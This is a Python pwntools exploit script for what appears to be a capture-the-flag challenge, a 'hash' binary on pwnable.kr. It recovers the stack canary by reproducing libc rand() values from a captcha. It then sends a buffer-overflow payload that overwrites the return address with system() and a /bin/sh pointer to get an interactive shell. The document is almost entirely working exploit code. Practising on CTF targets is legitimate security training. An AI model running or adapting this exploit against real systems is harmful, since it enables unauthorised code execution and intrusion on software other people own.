from pwn import *
from re import search
from sys import argv
from base64 import b64encode
from msl.loadlib import Client64
import numpy as np
from struct import pack


class LibcClient(Client64):
    def __init__(self):
        # Specify the name of the Python module to execute on the 32-bit server (i.e., 'my_server')
        super(LibcClient, self).__init__(module32='libc_server')

    def get_rand_values(self, n):
        return self.request32('get_rand_values', n)


def i2b(i): return str(i).encode()


def get_canary():
    # Extract captcha
    captcha = np.int32(int(search(r'-?\d+', p.recvline().decode())[0], 10))

    libc_client = LibcClient()
    rvs = libc_client.get_rand_values(8)
    
    canary = np.uint32(captcha - rvs[5] - rvs[1] - (rvs[2] - rvs[3]) - (rvs[4] - rvs[6]) - rvs[7])
    log.info(f'[i] Reverted canary: {hex(canary)}')

    p.sendline(i2b(captcha)) # now we can send captcha back
    return canary


def get_shell(canary):
    # fill buf
    payload = b'A' * 0x200
    payload += pack('<L', canary)
    payload += b'A' * 12 # ofst between canary and ra
    payload += p32(e.plt['system']) # overwrite ra with address of system
    payload += b'A' * 4 # simulate call
    payload += p32(0x804b3b0) # add ptr. to /bin/sh

    payload = b64encode(payload)
    payload += b'/bin/sh\x00'

    p.sendline(payload)

if len(argv) == 2 and argv[1] == 'remote':
    p = remote('pwnable.kr', 9002)
else:
    p = process('./hash')
e = ELF('./hash')
context.log_level = 'debug'

# Read welcome msg
p.recvline()

# my_hash function leaks canary, so get it
canary = get_canary()
if len(argv) == 2 and argv[1] == 'debug':
    gdb.attach(p)
    raw_input('[i] Press ENTER to continue')


# And now use the canary with buffer overflow to gain shell
get_shell(canary)

p.interactive()